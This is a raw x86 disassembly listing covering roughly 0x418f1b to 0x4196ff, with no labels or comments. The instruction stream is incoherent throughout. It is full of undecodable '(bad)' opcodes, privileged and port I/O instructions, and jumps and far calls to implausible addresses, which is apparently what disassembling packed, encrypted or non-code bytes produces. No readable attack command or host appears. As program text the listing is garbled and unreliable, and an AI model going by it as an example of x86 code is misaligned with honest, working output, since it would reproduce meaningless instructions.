  418f1b:	neg    DWORD PTR [ebx]
  418f1d:	jg     0x418eb0
  418f1f:	jg     0x418f4a
  418f21:	push   ecx
  418f22:	push   ecx
  418f23:	mov    ebp,DWORD PTR [ebx]
  418f25:	jle    0x418f8e
  418f27:	stos   BYTE PTR es:[edi],al
  418f28:	mov    WORD PTR [edi+esi*1+0x3af5bf4d],fs
  418f2f:	cmp    ah,ch
  418f31:	test   cl,bh
  418f33:	xor    BYTE PTR [ecx-0x156e95cf],ch
  418f39:	mov    ch,0x2d
  418f3b:	jg     0x418f57
  418f3d:	cmp    dl,BYTE PTR [esi]
  418f3f:	jb     0x418f71
  418f41:	pusha  
  418f42:	(bad)  
  418f44:	jl     0x418f86
  418f46:	(bad)  
  418f47:	out    0x3d,al
  418f49:	dec    edi
  418f4a:	mov    edi,0xf8287698
  418f4f:	mov    ds:0x6324eb24,al
  418f54:	mov    cl,0x83
  418f56:	rcr    DWORD PTR [ebp-0x3e],1
  418f59:	rcl    al,1
  418f5b:	mov    eax,ds:0x6776b545
  418f60:	cmp    DWORD PTR [ecx],ebx
  418f62:	jmp    0x32386118
  418f67:	dec    ebp
  418f68:	jge    0x418fc5
  418f6a:	dec    ebx
  418f6b:	inc    ebx
  418f6c:	cmc    
  418f6d:	xchg   ebx,eax
  418f6e:	test   al,0x59
  418f70:	inc    ecx
  418f71:	test   DWORD PTR [esi+0x5c],edi
  418f74:	mov    ah,0x2d
  418f76:	and    eax,DWORD PTR ss:[ecx-0x5a]
  418f7a:	inc    esp
  418f7b:	mov    ebx,0x2aa5568c
  418f80:	aad    0x58
  418f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f83:	or     eax,0x89111906
  418f88:	jg     0x418f20
  418f8a:	dec    edi
  418f8b:	mov    dl,0x63
  418f8d:	(bad)  
  418f8e:	jmp    0xcd93c5a2
  418f93:	std    
  418f94:	imul   eax,DWORD PTR [eax],0xc987fd67
  418f9a:	or     eax,0xbbab265c
  418f9f:	sub    dl,BYTE PTR [edx+ebx*1+0x52f7cdb3]
  418fa6:	lahf   
  418fa7:	xchg   DWORD PTR [ebx+eiz*2],ebp
  418faa:	clc    
  418fab:	mov    ecx,0xa0a1c0f8
  418fb0:	or     DWORD PTR [edx+0x3],esi
  418fb3:	shr    DWORD PTR [ebx-0x3a79f7aa],cl
  418fb9:	push   eax
  418fba:	outs   dx,DWORD PTR ds:[esi]
  418fbb:	dec    edx
  418fbc:	retf   
  418fbd:	cli    
  418fbe:	inc    edi
  418fbf:	fld    DWORD PTR [ecx]
  418fc1:	or     ch,dh
  418fc3:	shr    BYTE PTR [ecx+0x5c],cl
  418fc6:	inc    esi
  418fc7:	test   eax,ecx
  418fc9:	jae    0x418fce
  418fcb:	adc    DWORD PTR ds:0xaac0a74c,0xffffffbb
  418fd2:	dec    edx
  418fd3:	ds cmp eax,0x136436b2
  418fd9:	lds    esp,FWORD PTR [esi]
  418fdb:	or     esi,DWORD PTR [edi+0x12f95260]
  418fe1:	fld    DWORD PTR [ebx+0x62933a78]
  418fe7:	mov    edx,0x4d8bdd60
  418fec:	jmp    0x77a31af5
  418ff1:	push   esi
  418ff2:	pop    edx
  418ff3:	imul   edx,DWORD PTR [eax],0xffffffe5
  418ff6:	das    
  418ff7:	sahf   
  418ff8:	cmp    eax,0x59d8b5a0
  418ffd:	icebp  
  418ffe:	std    
  418fff:	inc    edx
  419000:	lea    edx,[esi+edi*2+0x66825a98]
  419007:	pop    ebp
  419008:	push   ebx
  419009:	jne    0x419067
  41900b:	sub    BYTE PTR [edx],bh
  41900d:	dec    ebx
  41900e:	mov    ebp,0xebc41706
  419013:	push   0xfffffff8
  419015:	inc    ebx
  419016:	es push eax
  419018:	xchg   esi,eax
  419019:	shl    BYTE PTR [ebp+0x6],cl
  41901c:	mov    ecx,edi
  41901e:	aam    0x77
  419020:	cmp    BYTE PTR [esp+eax*2-0x36],al
  419024:	mov    dh,0x3b
  419026:	jbe    0x418fdb
  419028:	into   
  419029:	lea    ecx,[edx-0x702781dc]
  41902f:	adc    DWORD PTR [edx-0x59],0x70cf9712
  419036:	jle    0x419033
  419038:	push   edx
  419039:	retf   0xa815
  41903c:	nop
  41903d:	(bad)  
  41903e:	mov    ds:0xbe55a59c,eax
  419043:	mov    ebx,DWORD PTR [edi-0x3a389491]
  419049:	popf   
  41904a:	add    dh,BYTE PTR ds:0x368e3c86
  419050:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419051:	(bad)  
  419053:	or     edi,0x67
  419056:	je     0x419027
  419058:	or     DWORD PTR [edi+0xe],eax
  41905b:	add    al,0x1e
  41905d:	sahf   
  41905e:	test   BYTE PTR [ecx],0xe8
  419061:	dec    eax
  419062:	xor    al,0x8
  419064:	loop   0x419053
  419066:	lahf   
  419067:	scas   eax,DWORD PTR es:[edi]
  419068:	js     0x419096
  41906a:	repz push esp
  41906c:	das    
  41906d:	dec    esi
  41906e:	pop    edi
  41906f:	stos   BYTE PTR es:[edi],al
  419070:	adc    esp,edx
  419072:	dec    ebp
  419073:	cmp    DWORD PTR [esi+0x20],esp
  419076:	or     esp,DWORD PTR [eax]
  419078:	and    eax,0xe331d35c
  41907d:	imul   esi,DWORD PTR [ebx*1-0x351e6d2d],0xefa30d74
  419088:	jl     0x4190fd
  41908a:	aam    0xad
  41908c:	mov    ?,eax
  41908e:	addr16 cwde 
  419090:	add    eax,0x7f526e12
  419095:	xchg   DWORD PTR [esi-0xf81ad2],ebp
  41909b:	inc    ecx
  41909c:	cmp    ecx,DWORD PTR [esp+ebx*2]
  41909f:	inc    ecx
  4190a0:	mov    edx,0xa531997c
  4190a5:	pop    edx
  4190a6:	inc    esi
  4190a7:	inc    ecx
  4190a8:	inc    ebx
  4190a9:	fiadd  DWORD PTR [esp+ebx*1]
  4190ac:	out    dx,eax
  4190ad:	adc    al,0xdf
  4190af:	add    DWORD PTR [ebx],edi
  4190b1:	dec    DWORD PTR [esi]
  4190b3:	aas    
  4190b4:	lds    edx,FWORD PTR [ebx-0xd3ffe86]
  4190ba:	icebp  
  4190bb:	into   
  4190bc:	imul   ecx,DWORD PTR [ecx+0x50],0xffffff8b
  4190c0:	(bad)  
  4190c1:	sub    ebx,DWORD PTR [edi]
  4190c3:	inc    edx
  4190c4:	(bad)  
  4190c5:	shl    BYTE PTR [eax+0x1d],cl
  4190c8:	aaa    
  4190c9:	in     al,0xbe
  4190cb:	or     eax,0xdec6c63c
  4190d0:	cld    
  4190d1:	mov    eax,ds:0x1ad3b667
  4190d6:	push   edx
  4190d7:	add    DWORD PTR [ecx],0x4f2333d6
  4190dd:	(bad)  
  4190de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190df:	dec    esi
  4190e0:	inc    eax
  4190e1:	inc    ebp
  4190e2:	xchg   ecx,eax
  4190e3:	(bad)
  4190e6:	(bad)  
  4190e7:	jmp    0xb882f6d2
  4190ec:	adc    ecx,DWORD PTR [ebp-0x748f886]
  4190f2:	leave  
  4190f3:	pop    ebx
  4190f4:	add    al,ch
  4190f6:	mov    ds:0x7d8a44d0,eax
  4190fb:	sub    cl,dl
  4190fd:	enter  0x1b0b,0xa9
  419101:	stos   BYTE PTR es:[edi],al
  419102:	(bad)  
  419104:	push   es
  419105:	sub    esi,DWORD PTR [eax-0x34]
  419108:	rcr    BYTE PTR [edi+0x5d80d0e],0x50
  41910f:	pop    eax
  419110:	and    bh,0x61
  419113:	add    esp,DWORD PTR [eax]
  419115:	jmp    0x9d874cab
  41911a:	test   DWORD PTR [edi+0x11],eax
  41911d:	fiadd  DWORD PTR [ebx+0x6e]
  419120:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419121:	add    al,0x7d
  419123:	fadd   DWORD PTR [edi]
  419125:	pop    eax
  419126:	inc    edi
  419127:	adc    ebx,DWORD PTR [ebp+0x15]
  41912a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41912b:	data16 and dl,BYTE PTR [esi]
  41912e:	cmc    
  41912f:	sub    eax,0x8ae79d92
  419134:	jmp    0x419130
  419136:	jb     0x419190
  419138:	xlat   BYTE PTR ds:[ebx]
  419139:	arpl   WORD PTR [edi],sp
  41913b:	pop    ebp
  41913c:	(bad)  
  41913d:	and    DWORD PTR [eax-0x29],ecx
  419140:	popa   
  419141:	mov    ds:0x23ba38f7,al
  419146:	out    dx,al
  419147:	shr    BYTE PTR ds:0xf3c5f55f,cl
  41914d:	sub    ecx,ebx
  41914f:	cmp    eax,DWORD PTR [ecx]
  419151:	fmulp  st(2),st
  419153:	push   es
  419154:	sti    
  419155:	(bad)  
  419156:	cdq    
  419157:	js     0x419152
  419159:	aaa    
  41915a:	retf   0x9927
  41915d:	pop    eax
  41915e:	loopne 0x4191b0
  419160:	out    0x4d,eax
  419162:	sbb    eax,0xc1a46ddf
  419167:	jp     0x41919a
  419169:	std    
  41916a:	jecxz  0x419129
  41916c:	aas    
  41916d:	mov    ds:0xead7d9d,eax
  419172:	mov    BYTE PTR [edx+0x75],al
  419175:	cwde   
  419176:	xor    eax,0xc412676a
  41917b:	push   es
  41917c:	add    DWORD PTR [eax-0x8],ebp
  41917f:	sbb    bl,bl
  419181:	pop    edx
  419182:	add    BYTE PTR [edx],ah
  419184:	mov    ecx,0x933fc741
  419189:	dec    ebx
  41918a:	jo     0x41917e
  41918c:	cmp    ecx,DWORD PTR [edi]
  41918e:	pop    eax
  41918f:	sub    al,0x97
  419191:	sbb    al,0xba
  419193:	mov    WORD PTR [esi+0x5d],es
  419196:	hlt    
  419197:	inc    ebp
  419198:	xor    dl,BYTE PTR [edi+eiz*2+0x14]
  41919c:	sub    dh,BYTE PTR [edi-0x17]
  41919f:	cmp    eax,0x296de3ee
  4191a4:	sub    ecx,DWORD PTR [esi+0x2f178ff8]
  4191aa:	push   ebp
  4191ab:	hlt    
  4191ac:	inc    edx
  4191ad:	scas   eax,DWORD PTR es:[edi]
  4191ae:	fiadd  DWORD PTR [esp+ebx*1-0x66]
  4191b2:	(bad)  
  4191b3:	adc    edx,DWORD PTR [esi+0x4d]
  4191b6:	mov    al,ds:0xba165ee0
  4191bb:	push   0xffffffbd
  4191bd:	inc    esp
  4191be:	ins    BYTE PTR es:[edi],dx
  4191bf:	adc    eax,0xa6886141
  4191c4:	inc    esp
  4191c5:	push   eax
  4191c6:	cmp    BYTE PTR [edi-0x53],ch
  4191c9:	inc    eax
  4191ca:	adc    ebp,DWORD PTR [ebx]
  4191cc:	sbb    al,0xc9
  4191ce:	(bad)  
  4191cf:	test   al,0x9d
  4191d1:	pushf  
  4191d2:	push   cs
  4191d3:	fidiv  WORD PTR [ebx+ebp*4-0x37]
  4191d7:	imul   ecx,DWORD PTR [edi+0x78],0xc299c440
  4191de:	mov    esi,0x848661ad
  4191e3:	xchg   DWORD PTR [edx+edi*2+0x13],edx
  4191e7:	push   0x5d6347a0
  4191ec:	cdq    
  4191ed:	int    0x59
  4191ef:	xor    esp,DWORD PTR [edx]
  4191f1:	push   ecx
  4191f2:	or     eax,0x4b8aa7c2
  4191f7:	call   0x402f9142
  4191fc:	test   BYTE PTR [ecx+0x29b6f546],cl
  419202:	dec    ecx
  419203:	jnp    0x419279
  419205:	shl    BYTE PTR ds:0x535c77b3,cl
  41920b:	into   
  41920c:	and    al,0xf1
  41920e:	fdivr  DWORD PTR [edx]
  419210:	ins    BYTE PTR es:[edi],dx
  419211:	(bad)  
  419212:	in     al,0x7b
  419214:	or     BYTE PTR [ecx+0x351d0f24],al
  41921a:	push   ss
  41921b:	jns    0x419224
  41921d:	mov    ebx,DWORD PTR [ebp+0x1e]
  419220:	add    eax,0x9a67d3da
  419225:	push   ebx
  419226:	sbb    eax,0x9376b691
  41922b:	mov    edx,DWORD PTR [eax+0x36]
  41922e:	ins    BYTE PTR es:[edi],dx
  41922f:	fdiv   DWORD PTR [ebx+0x32685595]
  419235:	add    bh,dh
  419237:	cdq    
  419238:	aaa    
  419239:	ss cmp al,0x0
  41923c:	push   0xd2bd667c
  419241:	cmp    BYTE PTR [eax+0x40db0c69],ch
  419247:	sbb    ecx,DWORD PTR [ebx]
  419249:	test   al,0x64
  41924b:	out    dx,al
  41924c:	retf   
  41924d:	out    dx,eax
  41924e:	sub    DWORD PTR [edx+edx*2-0x40],ecx
  419252:	sub    al,0xa1
  419254:	es push ds
  419256:	pop    es
  419257:	jnp    0x4191e0
  419259:	leave  
  41925a:	repnz mov edx,DWORD PTR ds:0x9080d7b5
  419261:	pop    ebx
  419262:	and    bh,BYTE PTR [ecx-0x1da68547]
  419268:	(bad)  
  419269:	fst    DWORD PTR [ebx-0x3b]
  41926c:	mov    bh,0x67
  41926e:	mov    dl,0x9d
  419270:	push   eax
  419271:	shr    ch,0x50
  419274:	test   eax,0xff74e744
  419279:	push   es
  41927a:	jo     0x4192b3
  41927c:	sar    bl,1
  41927e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41927f:	adc    dl,BYTE PTR [edi-0x74]
  419282:	retf   0xc3f5
  419285:	std    
  419286:	fdivr  st,st(3)
  419288:	inc    ebp
  419289:	or     eax,0x954294a8
  41928e:	lods   al,BYTE PTR ds:[esi]
  41928f:	fwait
  419290:	stos   BYTE PTR es:[edi],al
  419291:	into   
  419292:	cdq    
  419293:	pushf  
  419294:	dec    ebx
  419295:	mov    esi,0x773a678d
  41929a:	arpl   WORD PTR [ebx-0x31211051],bx
  4192a0:	pop    ss
  4192a1:	push   es
  4192a2:	mov    edx,0xdb90dd45
  4192a7:	aam    0x1c
  4192a9:	or     al,0x8b
  4192ab:	inc    ebp
  4192ac:	xchg   edx,eax
  4192ad:	add    ebp,DWORD PTR [ecx+edi*1-0x3fc69ef1]
  4192b4:	jno    0x41930f
  4192b6:	fisubr DWORD PTR [ebp+0x68]
  4192b9:	push   eax
  4192ba:	push   edx
  4192bb:	test   eax,0xd0f00d7d
  4192c0:	mov    edi,0x26a8a523
  4192c5:	mov    bh,0x75
  4192c7:	aad    0x47
  4192c9:	sbb    eax,0xa29862e3
  4192ce:	in     al,0xd8
  4192d0:	push   esi
  4192d1:	aas    
  4192d2:	mov    ch,0x22
  4192d4:	pop    ss
  4192d5:	repnz in al,0x8b
  4192d8:	jo     0x4192b8
  4192da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4192db:	das    
  4192dc:	sub    edi,DWORD PTR [esi+0x49d971c2]
  4192e2:	cmc    
  4192e3:	adc    dh,BYTE PTR [ecx-0x3fae53e2]
  4192e9:	jb     0x4192a1
  4192eb:	jo     0x41933d
  4192ed:	jmp    0x4192e9
  4192ef:	jo     0x4192e2
  4192f1:	xor    DWORD PTR [ebx],edi
  4192f3:	mov    eax,0x2cbbcf2a
  4192f8:	jmp    0x4192d8
  4192fa:	icebp  
  4192fb:	mov    ch,0x53
  4192fd:	pop    es
  4192fe:	and    eax,0xe54b2ab8
  419303:	scas   al,BYTE PTR es:[edi]
  419304:	popf   
  419305:	pop    edx
  419306:	jle    0x41933e
  419308:	addr16 adc eax,0x60104393
  41930e:	sbb    ebx,DWORD PTR [ecx+eax*2+0x3bb25b3f]
  419315:	push   cs
  419316:	xchg   esi,eax
  419317:	fimul  DWORD PTR [esi-0x49299bfb]
  41931d:	hlt    
  41931e:	xchg   edx,eax
  41931f:	xchg   esi,eax
  419320:	jne    0x419327
  419322:	popf   
  419323:	xor    ch,cl
  419325:	xor    eax,0x1646d7c7
  41932a:	or     DWORD PTR [edi+0x17],eax
  41932d:	es dec ebx
  41932f:	dec    ebp
  419330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419331:	test   al,0x20
  419333:	aad    0x69
  419335:	xchg   esi,eax
  419336:	lock cwde 
  419338:	mov    dh,0x82
  41933a:	and    al,0xc1
  41933c:	arpl   WORD PTR [edx+0x135583a7],sp
  419342:	xor    al,0x2e
  419344:	dec    ebx
  419345:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419346:	push   ecx
  419347:	mov    ch,ch
  419349:	fdiv   QWORD PTR [ebp+0x44]
  41934c:	pop    ebp
  41934d:	lods   eax,DWORD PTR ds:[esi]
  41934e:	sti    
  41934f:	dec    eax
  419350:	pop    ds
  419351:	push   edi
  419352:	mov    ebp,0x3c44288f
  419357:	mov    bl,0x10
  419359:	sub    DWORD PTR [ebx],ebp
  41935b:	push   ss
  41935c:	jbe    0x4192f6
  41935e:	test   DWORD PTR [ebp+0x23],0xbfda8d09
  419365:	dec    edx
  419366:	sub    DWORD PTR [eax+0x6075d0c],esi
  41936c:	mov    gs,WORD PTR [ebp-0x61]
  41936f:	ins    DWORD PTR es:[edi],dx
  419370:	repz out 0xb4,al
  419373:	pop    esi
  419374:	inc    edx
  419375:	dec    ecx
  419376:	in     al,0x1d
  419378:	inc    esi
  419379:	or     bl,BYTE PTR [ecx]
  41937b:	or     eax,0x77ce5b5e
  419380:	pop    ebx
  419381:	mov    ds:0xb011847b,eax
  419386:	pop    edx
  419387:	inc    esi
  419388:	das    
  419389:	add    DWORD PTR [esi*2-0x512689f0],0x30
  419391:	out    0x95,eax
  419393:	gs and eax,0x71a9b55c
  419399:	enter  0x9792,0x3c
  41939d:	stos   DWORD PTR es:[edi],eax
  41939e:	dec    ebp
  41939f:	jle    0x419368
  4193a1:	outs   dx,DWORD PTR ds:[esi]
  4193a2:	imul   ecx,esi,0x58
  4193a5:	mov    ds:0x97affcb7,eax
  4193aa:	out    0x7d,al
  4193ac:	pop    eax
  4193ad:	jae    0x4193df
  4193af:	hlt    
  4193b0:	cld    
  4193b1:	push   ebp
  4193b2:	mov    eax,ds:0x9397bd48
  4193b7:	test   eax,0x1c3d9e2b
  4193bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193bd:	pop    eax
  4193be:	ds inc edi
  4193c0:	ja     0x419361
  4193c2:	out    dx,eax
  4193c3:	imul   esi,DWORD PTR [esi-0x641c4d5c],0x6b39339a
  4193cd:	sbb    dh,al
  4193cf:	or     al,ch
  4193d1:	xor    bh,BYTE PTR [ecx+0x3f85b4cd]
  4193d7:	in     al,0x9f
  4193d9:	repnz jecxz 0x419388
  4193dc:	test   BYTE PTR [ebp+0x48098f51],bh
  4193e2:	inc    esp
  4193e3:	sbb    ebx,esp
  4193e5:	fs (bad) 
  4193e7:	gs aaa 
  4193e9:	data16 mov al,0x74
  4193ec:	iret   
  4193ed:	mov    ds:0x8b79a82e,eax
  4193f2:	xchg   edi,eax
  4193f3:	sahf   
  4193f4:	fidiv  WORD PTR [ecx-0x5c]
  4193f7:	ja     0x4193aa
  4193f9:	and    al,0x10
  4193fb:	js     0x41940e
  4193fd:	es xchg ecx,eax
  4193ff:	xor    esi,DWORD PTR [edi-0x10d4a05f]
  419405:	and    edx,DWORD PTR [edx-0x60f99691]
  41940b:	fdiv   QWORD PTR [ebp+0x25df4418]
  419411:	ret    
  419412:	int    0x9d
  419414:	xchg   DWORD PTR [edx-0x5dc22796],edi
  41941a:	retf   0x9c09
  41941d:	in     al,dx
  41941e:	or     esi,eax
  419420:	push   ebp
  419421:	sub    BYTE PTR [esi],al
  419423:	inc    eax
  419424:	repnz fidiv WORD PTR [edi-0x80]
  419428:	push   edi
  419429:	sub    ebx,eax
  41942b:	(bad)  
  41942c:	fs std 
  41942e:	mov    dh,0x8d
  419430:	jne    0x4193e7
  419432:	call   FWORD PTR [esp+esi*8-0x36]
  419436:	xchg   ecx,eax
  419437:	(bad)  
  419438:	loop   0x419408
  41943a:	mov    ds:0x9eed1d14,al
  41943f:	imul   edx,DWORD PTR [edx+0x10965d05],0xffffffb6
  419446:	sbb    eax,0xd55e8d1f
  41944b:	mov    ds:0xae9a3c53,eax
  419450:	dec    eax
  419451:	mov    ds:0xb8c0ad73,eax
  419456:	add    BYTE PTR [ecx+0x47dbb480],ah
  41945c:	xor    cl,BYTE PTR [ecx-0x7a]
  41945f:	sbb    BYTE PTR ds:0xe426446e,al
  419465:	test   BYTE PTR [esp+ebp*2],ch
  419468:	cmp    BYTE PTR [ecx],ch
  41946a:	or     al,0x8
  41946c:	xchg   edx,eax
  41946d:	imul   ebx,DWORD PTR [eax+0x11],0xffffff99
  419471:	mov    edi,esi
  419473:	sbb    BYTE PTR [edi+0x25d70a76],ah
  419479:	repnz mov edx,0x6e7813d4
  41947f:	xchg   edi,eax
  419480:	xchg   edi,eax
  419481:	pop    esp
  419482:	jmp    DWORD PTR [esi+0x6155386f]
  419488:	fdiv   QWORD PTR [edi]
  41948a:	call   0x8e7c:0x2aa2be3b
  419491:	pop    ebp
  419492:	cdq    
  419493:	pop    eax
  419494:	popf   
  419495:	mov    edx,0xfc6c3da7
  41949a:	mov    es,WORD PTR [ecx+ebp*8-0x6b]
  41949e:	clc    
  41949f:	inc    eax
  4194a0:	sbb    al,0x4b
  4194a2:	or     al,0xa6
  4194a4:	(bad)  
  4194a6:	mov    edx,0xf2066a8f
  4194ab:	loopne 0x4194d7
  4194ad:	sahf   
  4194ae:	mov    dh,0x6f
  4194b0:	adc    edi,DWORD PTR [esi+0x35707ac0]
  4194b6:	clc    
  4194b7:	mov    ebx,DWORD PTR cs:[eax-0x630549d8]
  4194be:	dec    bh
  4194c0:	fist   WORD PTR [eax-0x153c5045]
  4194c6:	push   esp
  4194c7:	mov    dl,0xdc
  4194c9:	dec    edx
  4194ca:	xchg   DWORD PTR [eax-0x5be55033],ebx
  4194d0:	dec    ebp
  4194d1:	loope  0x41950e
  4194d3:	addr16 push 0xffffffbf
  4194d6:	and    DWORD PTR [edx],edi
  4194d8:	pusha  
  4194d9:	pop    ebx
  4194da:	jge    0x4194e7
  4194dc:	dec    ebx
  4194dd:	aad    0xa2
  4194df:	push   esi
  4194e0:	ret    
  4194e1:	mov    dl,0x63
  4194e3:	scas   eax,DWORD PTR es:[edi]
  4194e4:	push   ecx
  4194e5:	cmp    BYTE PTR [edx-0x75],bl
  4194e8:	test   al,0xcd
  4194ea:	inc    ebp
  4194eb:	or     edx,ebp
  4194ed:	push   es
  4194ee:	or     bl,BYTE PTR [ebp+0x1a]
  4194f1:	or     BYTE PTR [eax-0x60ad7f87],bl
  4194f7:	int3   
  4194f8:	jmp    0x419506
  4194fa:	clc    
  4194fb:	or     BYTE PTR ds:0xb9c132f,0x44
  419502:	jl     0x4194a6
  419504:	dec    ebx
  419505:	xchg   ecx,eax
  419506:	sub    edi,DWORD PTR [edx+0x3a]
  419509:	mov    BYTE PTR [ebp-0x767e7c6c],0xd1
  419510:	aas    
  419511:	in     al,0x39
  419513:	pop    esp
  419514:	nop
  419515:	test   al,dh
  419517:	mov    al,0x4a
  419519:	xchg   ecx,eax
  41951a:	pop    ecx
  41951b:	icebp  
  41951c:	test   eax,0xa7ec98bf
  419521:	mov    bh,0xe1
  419523:	or     BYTE PTR [edi-0x5],0xef
  419527:	dec    esp
  419528:	lods   eax,DWORD PTR ds:[esi]
  419529:	pop    ds
  41952a:	fcom   QWORD PTR [eax+0x1f94a48]
  419530:	push   ebp
  419531:	fwait
  419532:	test   DWORD PTR [ecx-0x6568ca78],edx
  419538:	xor    al,0xa0
  41953a:	mov    dh,0x97
  41953c:	inc    eax
  41953d:	xor    ch,0x8b
  419540:	(bad)  
  419542:	pop    ebx
  419543:	out    dx,al
  419544:	mov    eax,ds:0xd5648d25
  419549:	mov    ds:0x2e94b5b,al
  41954e:	outs   dx,BYTE PTR ds:[esi]
  41954f:	scas   al,BYTE PTR es:[edi]
  419550:	xchg   ecx,eax
  419551:	xchg   edi,eax
  419552:	jmp    0x4195af
  419554:	or     bh,BYTE PTR [eax-0x15c3b93b]
  41955a:	xchg   edi,eax
  41955b:	stc    
  41955c:	dec    ecx
  41955d:	xchg   ebp,eax
  41955e:	mov    WORD PTR [edx-0xed2d114],cs
  419564:	xor    ecx,DWORD PTR [edi+0x3a]
  419567:	add    al,al
  419569:	addr16 in al,dx
  41956b:	sub    dh,0xe7
  41956e:	pop    eax
  41956f:	xor    DWORD PTR [ebp-0x752be80f],0xffffffac
  419576:	lds    eax,FWORD PTR [esi]
  419578:	mov    cl,0x9c
  41957a:	and    al,0xc5
  41957c:	call   0x1742bff6
  419581:	sub    eax,0x7aa5fd55
  419586:	test   BYTE PTR [edx+0x1e],dl
  419589:	or     BYTE PTR [edi-0x2e],dh
  41958c:	mov    ebx,0xe26dc0a8
  419591:	rol    BYTE PTR [eax],0x1d
  419594:	mov    dl,BYTE PTR [esi]
  419596:	shl    ah,1
  419598:	pop    eax
  419599:	sar    BYTE PTR ss:[ecx+ecx*8],1
  41959d:	outs   dx,DWORD PTR ds:[esi]
  41959e:	addr16 inc ebp
  4195a0:	sahf   
  4195a1:	ret    0x8cff
  4195a4:	cmp    al,0xc6
  4195a6:	and    BYTE PTR [bp+di],ch
  4195a9:	std    
  4195aa:	sub    eax,0xbb017e2f
  4195af:	fcmovnbe st,st(2)
  4195b1:	xchg   edi,eax
  4195b2:	aaa    
  4195b3:	mov    eax,DWORD PTR [ebp+0x76]
  4195b6:	and    eax,0xb43afaf1
  4195bb:	mov    BYTE PTR [ebp+0x174454df],dh
  4195c1:	scas   eax,DWORD PTR es:[edi]
  4195c2:	dec    edi
  4195c3:	call   0x8880ee81
  4195c8:	fcmove st,st(0)
  4195ca:	sub    eax,0xc567ca16
  4195cf:	xor    eax,0x1181da99
  4195d4:	mov    bl,0x27
  4195d6:	fcomip st,st(0)
  4195d8:	xchg   esi,eax
  4195d9:	pop    ebx
  4195da:	and    edi,DWORD PTR [edx-0x72]
  4195dd:	adc    cl,BYTE PTR [edx-0x5b854ea5]
  4195e3:	cmp    DWORD PTR [esi],esp
  4195e5:	mov    ds:0xb883e37,eax
  4195ea:	dec    edi
  4195eb:	mov    edx,0xf93106a1
  4195f1:	ret    0x8d49
  4195f4:	(bad)  
  4195f5:	sbb    edi,edx
  4195f7:	shl    ecx,1
  4195f9:	jb     0x4195c8
  4195fb:	hlt    
  4195fc:	ins    BYTE PTR es:[edi],dx
  4195fd:	sar    DWORD PTR [ecx],cl
  4195ff:	arpl   WORD PTR [esi],dx
  419601:	or     al,0xb2
  419603:	jmp    0x4d3a:0x3477bb6d
  41960a:	jmp    0x4195d7
  41960c:	cwde   
  41960d:	adc    eax,0xd8a73b63
  419612:	add    edx,DWORD PTR [edx+0x30]
  419615:	stc    
  419616:	and    DWORD PTR [edi],ecx
  419618:	inc    esi
  419619:	(bad)  
  41961a:	cmp    edx,DWORD PTR [eax+0x25]
  41961d:	pop    esi
  41961e:	xor    ch,BYTE PTR [ecx]
  419620:	daa    
  419621:	test   esp,eax
  419623:	push   es
  419624:	pop    esp
  419625:	adc    al,0x83
  419627:	es jg  0x41965b
  41962a:	cmp    dl,bh
  41962c:	into   
  41962d:	out    0xec,al
  41962f:	test   edi,ebx
  419631:	(bad)  
  419632:	and    DWORD PTR [edx+0x60a21bc8],edx
  419638:	out    0xba,eax
  41963a:	imul   ebp,DWORD PTR [edx-0x35518d2a],0x3e
  419641:	cmp    DWORD PTR [ebp+0x5915ff30],esi
  419647:	ins    BYTE PTR es:[edi],dx
  419648:	push   0x9
  41964a:	out    dx,al
  41964b:	push   esp
  41964c:	jae    0x41969d
  41964e:	push   esp
  41964f:	mov    edx,0x744b87d3
  419654:	mov    esp,0x38a589fc
  419659:	aad    0x43
  41965b:	test   al,0x3e
  41965d:	out    0x8b,eax
  41965f:	mov    eax,0x6f37e4e0
  419664:	add    ebx,DWORD PTR [edi+0x17c0a3d]
  41966a:	jle    0x419693
  41966c:	shl    BYTE PTR [edx],0x4d
  41966f:	pop    esp
  419670:	sub    DWORD PTR [ecx-0x1f476b64],0xafe15430
  41967a:	inc    ebp
  41967b:	mov    ebx,0xc2d3d06d
  419680:	xchg   ebx,eax
  419681:	push   esp
  419682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419683:	cmp    BYTE PTR cs:[esp+ebp*8-0x47],cl
  419688:	sahf   
  419689:	leave  
  41968a:	cwde   
  41968b:	jb     0x419676
  41968d:	repnz mov eax,DWORD PTR ds:0x7daf73fb
  419694:	fs mov esi,0xf51fbdfe
  41969a:	sub    edi,DWORD PTR [esi+eax*4+0x7e]
  41969e:	iret   
  41969f:	loope  0x4196c2
  4196a1:	pop    cx
  4196a3:	mov    bl,BYTE PTR [ebx+0x7c]
  4196a6:	das    
  4196a7:	dec    edx
  4196a8:	shl    BYTE PTR [eax+0x543df342],cl
  4196ae:	or     DWORD PTR [esi-0xf6a4415],edi
  4196b4:	aam    0x6f
  4196b6:	(bad)
  4196b9:	sbb    al,cl
  4196bb:	jne    0x41963f
  4196bd:	xor    al,0x1
  4196bf:	dec    ebx
  4196c0:	pop    ebx
  4196c1:	push   0xffffff93
  4196c3:	xor    eax,0xb7a19a97
  4196c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4196c9:	xchg   edx,eax
  4196ca:	jne    0x4196d1
  4196cc:	js     0x4196b1
  4196ce:	xor    DWORD PTR [ecx+0x3e],ecx
  4196d1:	xor    ebx,DWORD PTR ds:0xcebcac92
  4196d7:	cmp    DWORD PTR [ebp-0x76],edi
  4196da:	pop    es
  4196db:	inc    esp
  4196dc:	pop    ds
  4196dd:	test   eax,0xd94cd3bd
  4196e2:	imul   DWORD PTR es:[edx+ecx*4-0x4f]
  4196e7:	(bad)  
  4196e8:	ror    BYTE PTR [edx+0x3d],1
  4196eb:	jmp    0xe4565f4f
  4196f0:	shr    DWORD PTR [eax+0x3283b6eb],1
  4196f6:	inc    edx
  4196f7:	scas   eax,DWORD PTR es:[edi]
  4196f8:	add    ebx,DWORD PTR [edx+0x9134340]
  4196fe:	cli    
  4196ff:	lods   eax,DWORD PTR ds:[esi]
